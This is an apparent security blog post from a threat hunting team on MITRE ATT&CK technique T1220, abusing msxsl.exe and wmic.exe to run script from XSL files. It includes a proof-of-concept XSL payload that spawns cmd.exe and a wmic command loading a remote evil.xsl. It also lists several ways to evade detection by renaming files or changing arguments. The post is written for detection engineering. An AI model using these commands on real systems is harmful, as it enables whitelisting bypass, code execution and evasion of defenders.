Post"><svg width="25" height="25" class="r"><g fill-rule="evenodd"><path d="M15.6 5a.42.42 0 0 0 .17-.3.42.42 0 0 0-.12-.33l-2.8-2.79a.5.5 0 0 0-.7 0l-2.8 2.8a.4.4 0 0 0-.1.32c0 .12.07.23.16.3h.02a.45.45 0 0 0 .57-.04l2-2V10c0 .28.23.5.5.5s.5-.22.5-.5V2.93l2.02 2.02c.08.07.18.12.3.13.11.01.21-.02.3-.08v.01"></path><path d="M18 7h-1.5a.5.5 0 0 0 0 1h1.6c.5 0 .9.4.9.9v10.2c0 .5-.4.9-.9.9H6.9a.9.9 0 0 1-.9-.9V8.9c0-.5.4-.9.9-.9h1.6a.5.5 0 0 0 .35-.15A.5.5 0 0 0 9 7.5a.5.5 0 0 0-.15-.35A.5.5 0 0 0 8.5 7H7a2 2 0 0 0-2 2v10c0 1.1.9 2 2 2h11a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2"></path></g></svg></button></div></div></div></div><div class="hb s"></div><div class="s ay"></div></div></div></div></div></div><h1 id="5976" class="hc hd fn ba he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz gj">INTRODUCTION</h1><p id="9f04" class="ia ib fn ic b id ie hh if ig ih hl ii ij ik il im in io ip iq ir is it iu iv dm gj">A few months ago, our friends at Mitre added 4 new techniques to the <a href="https://attack.mitre.org/" class="ds iw" rel="noopener nofollow">ATT&amp;CK Framework</a> that we quickly assessed. One of the new technique was “XSL Script Processing” (<a href="https://attack.mitre.org/techniques/T1220/" class="ds iw" rel="noopener nofollow">T1220</a>) and while building detection for it we found some very interesting and not documented behaviors. This blog post intends to share the various findings we made during our experimentation with <a href="https://attack.mitre.org/techniques/T1220/" class="ds iw" rel="noopener nofollow">T1220</a>.</p><h1 id="3a04" class="hc hd fn ba he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz gj">What is XSL Script Processing?</h1><p id="8f8d" class="ia ib fn ic b id ie hh if ig ih hl ii ij ik il im in io ip iq ir is it iu iv dm gj">XSL stands for Extensible Stylesheet La<span id="rmm"><span id="rmm">n</span></span>guage and is used to express the style sheets. XSL is a standard for processing XML (Extensible Markup Language) data. XML is used for storing and transporting data and it does not do anything except this. Therefore, if we want to display content stored in XML document, we have to write a program to do so. One way of achieving this goal is to use XSL scripts as it can define how the content in XML document should be displayed on the screen. XSL is very flexible, so much so that it supports scripting in C#, VB, JScript, JavaScript and VisualBasic. If no language name is specified in XSL language attribute, then the default language is Jscript [3].</p><p id="724d" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">Example: Here is a simple XML Document:</p><pre class="jc jd je jf jg jh ji jj"><span id="8d90" class="gj jk hd fn jl b dn jm jn s jo">&lt;note&gt;<br/>&lt;team&gt;Threat Hunting Team&lt;/team&gt;<br/>&lt;Expertise&gt;<br/>Reverse Engineering, Penetration Testing Skills, Malware Analysis, Log Analysis, Red Team and Blue Team Operations&lt;/Expertise&gt;<br/>&lt;/note&gt;</span></pre><p id="0e3e" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">Now we have an XML file which defines the skills for Threat Hunting Team. However, to display it, we need some kind of program or code.</p><h1 id="da3a" class="hc hd fn ba he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz gj">XSL — An Adversaries’ Favorite</h1><p id="5b5d" class="ia ib fn ic b id ie hh if ig ih hl ii ij ik il im in io ip iq ir is it iu iv dm gj">As previously mentioned, XSL contains code to do formatting on XML files, which means that it can be a way to execute code supply by an attacker. Due to its legitimate functionality, attackers can use XSL to bypass application whitelisting and execute arbitrary code.</p><p id="5e07" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">One way to execute code through XSL files is to use Microsoft’s command line transformation utility i.e.: <strong class="ic cz"><em class="jp">msxsl.exe</em></strong>. This binary does not come pre-installed on Windows OS. Therefore, in order to take advantage of it, an adversary has to drop it on the system.</p><p id="671a" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">However, there is another way to run JScript or VBScript code from XSL files. An attacker can use WMIC.EXE to invoke the code from XML file. WMIC.EXE comes pre-installed on all the Windows OS.</p><p id="35a3" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">Both, MSXSL.EXE and WMIC.EXE, can be used to invoke code from local or remote XSL file.</p><h1 id="99ab" class="hc hd fn ba he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz gj">Abusing XSL</h1><p id="adcf" class="ia ib fn ic b id ie hh if ig ih hl ii ij ik il im in io ip iq ir is it iu iv dm gj">In this section, we will discuss how Mitre has explained different ways to exploit this technique using MSXSL.EXE and WMIC.EXE and what we have found during our experiments. We will use the following XSL and XML files for the POC.</p><p id="d91a" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><strong class="ic cz"><em class="jp">testXML.xml</em></strong></p><pre class="jc jd je jf jg jh ji jj"><span id="2a4f" class="gj jk hd fn jl b dn jm jn s jo">&lt;?xml version=<strong class="jl cz">&quot;1.0&quot;</strong>?&gt;<br/>&lt;?xml-stylesheet type=<strong class="jl cz">&quot;text/xsl&quot;</strong> href=<strong class="jl cz">&quot;TestXSL.xsl&quot;</strong> ?&gt;<br/>&lt;TEST&gt;<br/>&lt;name&gt;<strong class="jl cz">Test XSL Scripting</strong>&lt;/name&gt;<br/>&lt;/TEST</span></pre><p id="5627" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><strong class="ic cz"><em class="jp">testXSL.xsl</em></strong></p><pre class="jc jd je jf jg jh ji jj"><span id="ff57" class="gj jk hd fn jl b dn jm jn s jo">&lt;?xml version=<strong class="jl cz">&#x27;1.0&#x27;</strong>?&gt;<br/>&lt;stylesheet xmlns=<strong class="jl cz">&quot;http://www.w3.org/1999/XSL/Transform&quot;</strong> xmlns:ms=<strong class="jl cz">&quot;urn:schemas-microsoft-com:xslt&quot; </strong>xmlns:user=<strong class="jl cz">&quot;placeholder&quot; </strong>version=<strong class="jl cz">&quot;1.0&quot;</strong>&gt;<br/>&lt;output method=<strong class="jl cz">&quot;text&quot;</strong>/&gt;<br/>&lt;ms:script implements-prefix=<strong class="jl cz">&quot;user&quot;</strong> language=<strong class="jl cz">&quot;JScript&quot;</strong>&gt;<br/>&lt;![CDATA[<br/>var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);<br/>]]&gt;<strong class="jl cz"> <br/></strong>&lt;/ms:script&gt;<br/>&lt;/stylesheet&gt;</span></pre><p id="4043" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">The code in XSL file spawns a new Command Shell. You could even get a reverse shell using XSL file.</p><p id="de43" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">MSXSL.EXE is a command line utility to perform transformation on XML files. This binary is used for debugging, development and reverse engineering. Attackers also can use this binary to proxy code execution [https://attack.mitre.org/techniques/T1220/]. As per Mitre, this binary can be used to invoke code from local XSL file as follows:</p><p id="54f1" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">1. <em class="jp">Invoking code from local XSL file</em>: Once you have saved the above code snippets, open cmd.exe and run the following command to invoke the code from XSL file as follows:</p><pre class="jc jd je jf jg jh ji jj"><span id="1c5a" class="gj jk hd fn jl b dn jm jn s jo">C:\Users\Administrator\Desktop&gt; msxsl.exe testXML.xml textXSL.xsl</span></pre><figure class="jc jd je jf jg jr eu ev paragraph-image"><div role="button" tabindex="0" class="js jt ao ju w jv"><div class="eu ev jq"><div class="kb s ao kc"><div class="kd ke s"><div class="ej jw fd em ei jx w jy jz ka"><img alt="" class="fd em ei jx w kf kg kh" src="https://miro.medium.com/max/60/1*D-VjhwEVdnGHsyMw4qGeWg.png?q=20" width="940" height="362" role="presentation"/></div><img alt="" class="ej jw fd em ei jx w c" width="940" height="362" role="presentation"/><noscript><img alt="" class="fd em ei jx w" src="https://miro.medium.com/max/1880/1*D-VjhwEVdnGHsyMw4qGeWg.png" width="940" height="362" srcSet="https://miro.medium.com/max/552/1*D-VjhwEVdnGHsyMw4qGeWg.png 276w, https://miro.medium.com/max/1104/1*D-VjhwEVdnGHsyMw4qGeWg.png 552w, https://miro.medium.com/max/1280/1*D-VjhwEVdnGHsyMw4qGeWg.png 640w, https://miro.medium.com/max/1400/1*D-VjhwEVdnGHsyMw4qGeWg.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="ce73" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">As you can see from the above screenshot that new Command Shell has been spawned due to code in XSL File.</p><p id="66a7" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">As part of our team’s alert creation process, we always try to bypass our teammates signatures and find additional ways to perform the attack. Following are the different ways we have found to run code from XSL file:</p><p id="8095" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><em class="jp">1.</em> <em class="jp">Providing more than two Parameters: </em>Instead of passing just XML and XSL file, an attacker can pass more than two parameters by using “=” sign. The command to do so will be:</p><pre class="jc jd je jf jg jh ji jj"><span id="4628" class="gj jk hd fn jl b dn jm jn s jo">C:\Users\Administrator\Desktop\XSL&gt;msxsl.exe TestXML.xml TestXSL.xsl TestXSL.xsl=TestXML.xml TestXSL.xsl=TestXML.xml</span></pre><figure class="jc jd je jf jg jr eu ev paragraph-image"><div role="button" tabindex="0" class="js jt ao ju w jv"><div class="eu ev jq"><div class="kb s ao kc"><div class="ki ke s"><div class="ej jw fd em ei jx w jy jz ka"><img alt="" class="fd em ei jx w kf kg kh" src="https://miro.medium.com/max/60/1*14MYo7fy9O5hhg8XbNsLnA.png?q=20" width="940" height="394" role="presentation"/></div><img alt="" class="ej jw fd em ei jx w c" width="940" height="394" role="presentation"/><noscript><img alt="" class="fd em ei jx w" src="https://miro.medium.com/max/1880/1*14MYo7fy9O5hhg8XbNsLnA.png" width="940" height="394" srcSet="https://miro.medium.com/max/552/1*14MYo7fy9O5hhg8XbNsLnA.png 276w, https://miro.medium.com/max/1104/1*14MYo7fy9O5hhg8XbNsLnA.png 552w, https://miro.medium.com/max/1280/1*14MYo7fy9O5hhg8XbNsLnA.png 640w, https://miro.medium.com/max/1400/1*14MYo7fy9O5hhg8XbNsLnA.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="6ced" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><em class="jp">2.</em> <em class="jp">Using XSL file instead of XML File: </em>To evade detection based on type of parameters passed to MSXSL.EXE, to run the code, an attacker can pass XSL file instead of XML file as follows:</p><pre class="jc jd je jf jg jh ji jj"><span id="1fa4" class="gj jk hd fn jl b dn jm jn s jo">C:\Users\Administrator\Desktop\XSL&gt;msxsl.exe TestXSL.xsl TestXSL.xsl</span></pre><figure class="jc jd je jf jg jr eu ev paragraph-image"><div role="button" tabindex="0" class="js jt ao ju w jv"><div class="eu ev jq"><div class="kb s ao kc"><div class="kj ke s"><div class="ej jw fd em ei jx w jy jz ka"><img alt="" class="fd em ei jx w kf kg kh" src="https://miro.medium.com/max/60/1*ZLJLD44eDUMTSTtJVWlwGw.png?q=20" width="940" height="396" role="presentation"/></div><img alt="" class="ej jw fd em ei jx w c" width="940" height="396" role="presentation"/><noscript><img alt="" class="fd em ei jx w" src="https://miro.medium.com/max/1880/1*ZLJLD44eDUMTSTtJVWlwGw.png" width="940" height="396" srcSet="https://miro.medium.com/max/552/1*ZLJLD44eDUMTSTtJVWlwGw.png 276w, https://miro.medium.com/max/1104/1*ZLJLD44eDUMTSTtJVWlwGw.png 552w, https://miro.medium.com/max/1280/1*ZLJLD44eDUMTSTtJVWlwGw.png 640w, https://miro.medium.com/max/1400/1*ZLJLD44eDUMTSTtJVWlwGw.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="f57c" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><em class="jp">3.</em> <em class="jp">Renaming XSL file to arbitrary extension: </em>Again, if defenders are monitoring file extensions passed to MSXSL.EXE, an attacker can rename XSL file to any extension and MSXSL.EXE will execute the code contained in XSL file, thus bypassing the detection. The reason why this works is that MSXSL.EXE looks at the header of the file to determine file type. Example of this attack is as follows:</p><pre class="jc jd je jf jg jh ji jj"><span id="cf98" class="gj jk hd fn jl b dn jm jn s jo">C:\Users\Administrator\Desktop\XSL&gt;msxsl.exe TestXSL.jpeg TestXSL.jpeg</span></pre><figure class="jc jd je jf jg jr eu ev paragraph-image"><div role="button" tabindex="0" class="js jt ao ju w jv"><div class="eu ev jq"><div class="kb s ao kc"><div class="kk ke s"><div class="ej jw fd em ei jx w jy jz ka"><img alt="" class="fd em ei jx w kf kg kh" src="https://miro.medium.com/max/60/1*sGJYLD6gKg81lNO2TyIwjw.png?q=20" width="940" height="346" role="presentation"/></div><img alt="" class="ej jw fd em ei jx w c" width="940" height="346" role="presentation"/><noscript><img alt="" class="fd em ei jx w" src="https://miro.medium.com/max/1880/1*sGJYLD6gKg81lNO2TyIwjw.png" width="940" height="346" srcSet="https://miro.medium.com/max/552/1*sGJYLD6gKg81lNO2TyIwjw.png 276w, https://miro.medium.com/max/1104/1*sGJYLD6gKg81lNO2TyIwjw.png 552w, https://miro.medium.com/max/1280/1*sGJYLD6gKg81lNO2TyIwjw.png 640w, https://miro.medium.com/max/1400/1*sGJYLD6gKg81lNO2TyIwjw.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="3ab5" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">So, these are some of the additional ways that an attacker can use to perform code execution using MSXSL.EXE.</p><h1 id="f7f3" class="hc hd fn ba he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz gj">Code Execution through WMIC.EXE</h1><p id="205c" class="ia ib fn ic b id ie hh if ig ih hl ii ij ik il im in io ip iq ir is it iu iv dm gj">WMIC.EXE is the command line utility to use WMI (Windows Management Instrumentation). WMI is out of scope of this article, but it can be used to perform almost all the tasks on local or remote system (<a href="https://attack.mitre.org/techniques/T1047/" class="ds iw" rel="noopener nofollow">T1047</a>). It is one of the favourite tools that attackers use for reconnaissance, code execution, lateral movement, etc.</p><p id="daa9" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">According to the information provided about this technique in Mitre’s ATT&amp;CK framework (<a href="https://attack.mitre.org/techniques/T1220/" class="ds iw" rel="noopener nofollow">T1220</a>), an attacker can also use WMI to do code execution by using <strong class="ic cz"><em class="jp">/Format</em></strong> switch. WMIC.EXE is capable to run code from locally or remote XSL file.</p><p id="3556" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">As per the ATT&amp;CK Framework, following are the different ways of code execution using WMIC.EXE:</p><p id="50bd" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><em class="jp">1.</em> <em class="jp">Execute code from Local File:</em></p><pre class="jc jd je jf jg jh ji jj"><span id="c156" class="gj jk hd fn jl b dn jm jn s jo">wmic process list /FORMAT:evil.xsl</span></pre><p id="70f0" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><em class="jp">2.</em> <em class="jp">Execute code from Remote File:</em></p><pre class="jc jd je jf jg jh ji jj"><span id="7632" class="gj jk hd fn jl b dn jm jn s jo">wmic os get /FORMAT:&quot;<a href="https://example.com/evil.xsl" class="ds iw" rel="noopener nofollow">https://example.com/evil.xsl</a>&quot;</span></pre><p id="6b64" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">After experimenting with WMIC.EXE, we found the following additional ways to run the code from XSL File:</p><p id="6618" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><em class="jp">1.</em> <em class="jp">Omit File Extension: </em>One of the way that a defender can choose to make an alert on this is to use file extension in a rule’s logic. However, it is very easy to bypass that kind of rule. To bypass that, the only thing that an attacker has to do is to create a XSL file and save it with <strong class="ic cz"><em class="jp">.xsl</em></strong> format. While invoking XSL file, just omit the file extension.</p><pre class="jc jd je jf jg jh ji jj"><span id="1d13" class="gj jk hd fn jl b dn jm jn s jo">C:\Users\Administrator\Desktop\XSL&gt;wmic os get /Format:TestXSL</span></pre><figure class="jc jd je jf jg jr eu ev paragraph-image"><div role="button" tabindex="0" class="js jt ao ju w jv"><div class="eu ev jq"><div class="kb s ao kc"><div class="kl ke s"><div class="ej jw fd em ei jx w jy jz ka"><img alt="" class="fd em ei jx w kf kg kh" src="https://miro.medium.com/max/60/1*tzgkS0UoHScxfM7J1DyjJA.png?q=20" width="940" height="266" role="presentation"/></div><img alt="" class="ej jw fd em ei jx w c" width="940" height="266" role="presentation"/><noscript><img alt="" class="fd em ei jx w" src="https://miro.medium.com/max/1880/1*tzgkS0UoHScxfM7J1DyjJA.png" width="940" height="266" srcSet="https://miro.medium.com/max/552/1*tzgkS0UoHScxfM7J1DyjJA.png 276w, https://miro.medium.com/max/1104/1*tzgkS0UoHScxfM7J1DyjJA.png 552w, https://miro.medium.com/max/1280/1*tzgkS0UoHScxfM7J1DyjJA.png 640w, https://miro.medium.com/max/1400/1*tzgkS0UoHScxfM7J1DyjJA.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="1724" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">Furthermore, <strong class="ic cz"><em class="jp">/FORMAT</em></strong> switch has these format specifiers: CSV, HFORM, HTABLE, LIST, MOF, RAWXML, TABLE, VALUE, XML, etc. As WMI is used a lot by legitimate utilities and it is very noisy in some environments, an attacker can play even more intelligently by creating XSL file with name of format specifiers file with same name as of supported format specifiers. Ex: an attacker can create XSL file named list.xsl because <strong class="ic cz"><em class="jp">list</em></strong> is one of the supported format specifier.</p><p id="f04e" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">Then to invoke code from this, attacker can run the following command:</p><pre class="jc jd je jf jg jh ji jj"><span id="8051" class="gj jk hd fn jl b dn jm jn s jo">C:\Users\Administrator\Desktop\XSL&gt;wmic os get /Format:.\list</span></pre><figure class="jc jd je jf jg jr eu ev paragraph-image"><div role="button" tabindex="0" class="js jt ao ju w jv"><div class="eu ev jq"><div class="kb s ao kc"><div class="km ke s"><div class="ej jw fd em ei jx w jy jz ka"><img alt="" class="fd em ei jx w kf kg kh" src="https://miro.medium.com/max/60/1*_I8ir_TkhfOeKY9wdEPfYg.png?q=20" width="940" height="556" role="presentation"/></div><img alt="" class="ej jw fd em ei jx w c" width="940" height="556" role="presentation"/><noscript><img alt="" class="fd em ei jx w" src="https://miro.medium.com/max/1880/1*_I8ir_TkhfOeKY9wdEPfYg.png" width="940" height="556" srcSet="https://miro.medium.com/max/552/1*_I8ir_TkhfOeKY9wdEPfYg.png 276w, https://miro.medium.com/max/1104/1*_I8ir_TkhfOeKY9wdEPfYg.png 552w, https://miro.medium.com/max/1280/1*_I8ir_TkhfOeKY9wdEPfYg.png 640w, https://miro.medium.com/max/1400/1*_I8ir_TkhfOeKY9wdEPfYg.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="62f0" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj"><em class="jp">2.</em> <em class="jp">Using other WMI aliases: </em>Attacker can use any alias in WMI to do code execution. The only condition is that the alias must have <strong class="ic cz"><em class="jp">/FORMAT</em></strong> switch. For example, instead of OS or PROCESS alias, an attacker can use other aliases like CPU, BIOS, etc.</p><figure class="jc jd je jf jg jr eu ev paragraph-image"><div role="button" tabindex="0" class="js jt ao ju w jv"><div class="eu ev jq"><div class="kb s ao kc"><div class="kn ke s"><div class="ej jw fd em ei jx w jy jz ka"><img alt="" class="fd em ei jx w kf kg kh" src="https://miro.medium.com/max/60/1*Z_8vjQvoGu1XnhFNj8Xr4Q.png?q=20" width="940" height="294" role="presentation"/></div><img alt="" class="ej jw fd em ei jx w c" width="940" height="294" role="presentation"/><noscript><img alt="" class="fd em ei jx w" src="https://miro.medium.com/max/1880/1*Z_8vjQvoGu1XnhFNj8Xr4Q.png" width="940" height="294" srcSet="https://miro.medium.com/max/552/1*Z_8vjQvoGu1XnhFNj8Xr4Q.png 276w, https://miro.medium.com/max/1104/1*Z_8vjQvoGu1XnhFNj8Xr4Q.png 552w, https://miro.medium.com/max/1280/1*Z_8vjQvoGu1XnhFNj8Xr4Q.png 640w, https://miro.medium.com/max/1400/1*Z_8vjQvoGu1XnhFNj8Xr4Q.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><h1 id="4b78" class="hc hd fn ba he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz gj">Conclusion</h1><p id="88aa" class="ia ib fn ic b id ie hh if ig ih hl ii ij ik il im in io ip iq ir is it iu iv dm gj">So if you are Blue Team member and want to detect this attack, then build your rule based binary name (wmic.exe and msxsl.exe) and it’s metadata like Binary’s description field (if using Sysmon) because it is very easy for an attacker to copy binary to a folder that he controls and rename it. Moreover, to detect XSL execution with WMIC.EXE, you can use regex to monitor parameter passed to <strong class="ic cz"><em class="jp">/FORMAT</em></strong> switch.</p><p id="a8d2" class="ia ib fn ic b id ix hh if ig iy hl ii ij iz il im in ja ip iq ir jb it iu iv dm gj">As Threat Hunters and detection builder, we always try to find ways to perform an attack without triggering our signatures. So, we encourage all of you to explore the attack, play with parameters, binary location, security descriptors, etc. Here’s an excellent talk from Daniel Bohannon and Matthew Dunwoody about building resilient signatures if you are interested in learning more on the subject: <a href="https://youtu.be/YGJaj6_3dGA" class="ds iw" rel="noopener nofollow">https://youtu.be/YGJaj6_3dGA</a></p></div></div></section></div></article><div class="ej fh ek kv w kw em kt kx" data-test-id="post-sidebar"><div class="n p"><div class="ap aq ar as at au av w"><div class="ky n ak"><div class="fh"><div><div class="kz an s"><div class="la s"><a class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" rel="noopener" href="/@threathuntingteam?source=post_sidebar--------------------------post_sidebar-----------"><h2 class="ba he dn bc dk gj dm">TH Team</h2></a></div><div class="lb s"><span><button class="ba b bb bc lc be ld le bh lf bk bl bm bn lg bq br bs bt bu bv bw">Follow</button></span></div></div><div class="lh li lj n"><div class="n o"><div class="s ao lk ll lm ln lo"><span><a href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8d524f642b75&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40threathuntingteam%2Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75&amp;user=TH%20Team&amp;userId=f7e306e00fce&amp;source=post_sidebar-----8d524f642b75---------------------clap_sidebar-----------" class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" rel="noopener"><div class="ce lp lq lr ls lt lu lv r lw lx"><svg width="29" height="29" aria-label="clap"><g fill-rule="evenodd"><path d="M13.74 1l.76 2.97.76-2.97zM16.82 4.78l1.84-2.56-1.43-.47zM10.38 2.22l1.84 2.56-.41-3.03zM22.38 22.62a5.11 5.11 0 0 1-3.16 1.61l.49-.45c2.88-2.89 3.45-5.98 1.69-9.21l-1.1-1.94-.96-2.02c-.31-.67-.23-1.18.25-1.55a.84.84 0 0 1 .66-.16c.34.05.66.28.88.6l2.85 5.02c1.18 1.97 1.38 5.12-1.6 8.1M9.1 22.1l-5.02-5.02a1 1 0 0 1 .7-1.7 1 1 0 0 1 .72.3l2.6 2.6a.44.44 0 0 0 .63-.62L6.1 15.04l-1.75-1.75a1 1 0 1 1 1.41-1.41l4.15 4.15a.44.44 0 0 0 .63 0 .44.44 0 0 0 0-.62L6.4 11.26l-1.18-1.18a1 1 0 0 1 0-1.4 1.02 1.02 0 0 1 1.41 0l1.18 1.16L11.96 14a.44.44 0 0 0 .62 0 .44.44 0 0 0 0-.63L8.43 9.22a.99.99 0 0 1-.3-.7.99.99 0 0 1 .3-.7 1 1 0 0 1 1.41 0l7 6.98a.44.44 0 0 0 .7-.5l-1.35-2.85c-.31-.68-.23-1.19.25-1.56a.85.85 0 0 1 .66-.16c.34.06.66.28.88.6L20.63 15c1.57 2.88 1.07 5.54-1.55 8.16a5.62 5.62 0 0 1-5.06 1.65 9.35 9.35 0 0 1-4.93-2.72zM13 6.98l2.56 2.56c-.5.6-.56 1.41-.15 2.28l.26.56-4.25-4.25a.98.98 0 0 1-.12-.45 1 1 0 0 1 .29-.7 1.02 1.02 0 0 1 1.41 0zm8.89 2.06c-.38-.56-.9-.92-1.49-1.01a1.74 1.74 0 0 0-1.34.33c-.38.29-.61.65-.71 1.06a2.1 2.1 0 0 0-1.1-.56 1.78 1.78 0 0 0-.99.13l-2.64-2.64a1.88 1.88 0 0 0-2.65 0 1.86 1.86 0 0 0-.48.85 1.89 1.89 0 0 0-2.67-.01 1.87 1.87 0 0 0-.5.9c-.76-.75-2-.75-2.7-.04a1.88 1.88 0 0 0 0 2.66c-.3.12-.61.29-.87.55a1.88 1.88 0 0 0 0 2.66l.62.62a1.88 1.88 0 0 0-.9 3.16l5.01 5.02c1.6 1.6 3.52 2.64 5.4 2.96a7.16 7.16 0 0 0 1.18.1c1.03 0 2-.25 2.9-.7A5.9 5.9 0 0 0 23 23.24c3.34-3.34 3.08-6.93 1.74-9.17l-2.87-5.04z"></path></g></svg></div></a></span></div><div class="s ly lz ma mb mc md me"><div class="mf"><p class="ba b bb bc by"><button class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx">66<!-- --> </button></p></div></div></div></div><div class="li s"><button class="ls lq ce"><div class="mh n o ax"><svg width="25" height="25" class="r mg ls lx" aria-label="responses"><path d="M19.07 21.12a6.33 6.33 0 0 1-3.53-1.1 7.8 7.8 0 0 1-.7-.52c-.77.21-1.57.32-2.38.32-4.67 0-8.46-3.5-8.46-7.8C4 7.7 7.79 4.2 12.46 4.2c4.66 0 8.46 3.5 8.46 7.8 0 2.06-.85 3.99-2.4 5.45a6.28 6.28 0 0 0 1.14 2.59c.15.21.17.48.06.7a.69.69 0 0 1-.62.38h-.03zm0-1v.5l.03-.5h-.03zm-3.92-1.64l.21.2a6.09 6.09 0 0 0 3.24 1.54 7.14 7.14 0 0 1-.83-1.84 5.15 5.15 0 0 1-.16-.75 2.4 2.4 0 0 1-.02-.29v-.23l.18-.15a6.6 6.6 0 0 0 2.3-4.96c0-3.82-3.4-6.93-7.6-6.93-4.19 0-7.6 3.11-7.6 6.93 0 3.83 3.41 6.94 7.6 6.94.83 0 1.64-.12 2.41-.35l.28-.08z" fill-rule="evenodd"></path></svg><div class="s ao mi mj mk ml mm mn mo mp"></div></div></button></div></div></div></div></div></div></div><div class="ej fh ko ek kp kq kr ks kt ku"></div><div><div class="mq jr n ak p"><div class="n p"><div class="ap aq ar as at fl av w"><div class="n ct"></div><div class="n o ct"></div><div class="mr mq s"><div class="ms n cj gz"><div class="n o ax"><div class="mt s"><span class="s mu mv mw e d"><div class="n o"><div class="s ao lk ll lm ln lo"><span><a href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8d524f642b75&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40threathuntingteam%2Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75&amp;user=TH%20Team&amp;userId=f7e306e00fce&amp;source=post_actions_footer-----8d524f642b75---------------------clap_footer-----------" class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" rel="noopener"><div class="ce lp lq lr ls lt lu lv r lw lx"><svg width="25" height="25" viewBox="0 0 25 25" aria-label="clap"><g fill-rule="evenodd"><path d="M11.74 0l.76 2.97.76-2.97zM14.81 3.78l1.84-2.56-1.42-.47zM8.38 1.22l1.84 2.56L9.8.75zM20.38 21.62a5.11 5.11 0 0 1-3.16 1.61l.49-.45c2.88-2.89 3.45-5.98 1.69-9.21l-1.1-1.94-.96-2.02c-.31-.67-.23-1.18.25-1.55a.84.84 0 0 1 .66-.16c.34.05.66.28.88.6l2.85 5.02c1.18 1.97 1.38 5.12-1.6 8.1M7.1 21.1l-5.02-5.02a1 1 0 0 1 .7-1.7 1 1 0 0 1 .72.3l2.6 2.6a.44.44 0 0 0 .63-.62L4.1 14.04l-1.75-1.75a1 1 0 1 1 1.41-1.41l4.15 4.15a.44.44 0 0 0 .63 0 .44.44 0 0 0 0-.62L4.4 10.26 3.22 9.08a1 1 0 0 1 0-1.4 1.02 1.02 0 0 1 1.41 0l1.18 1.16L9.96 13a.44.44 0 0 0 .62 0 .44.44 0 0 0 0-.63L6.43 8.22a.99.99 0 0 1-.3-.7.99.99 0 0 1 .3-.7 1 1 0 0 1 1.41 0l7 6.98a.44.44 0 0 0 .7-.5l-1.35-2.85c-.31-.68-.23-1.19.25-1.56a.85.85 0 0 1 .66-.16c.34.06.66.28.88.6L18.63 14c1.57 2.88 1.07 5.54-1.55 8.16a5.62 5.62 0 0 1-5.06 1.65 9.35 9.35 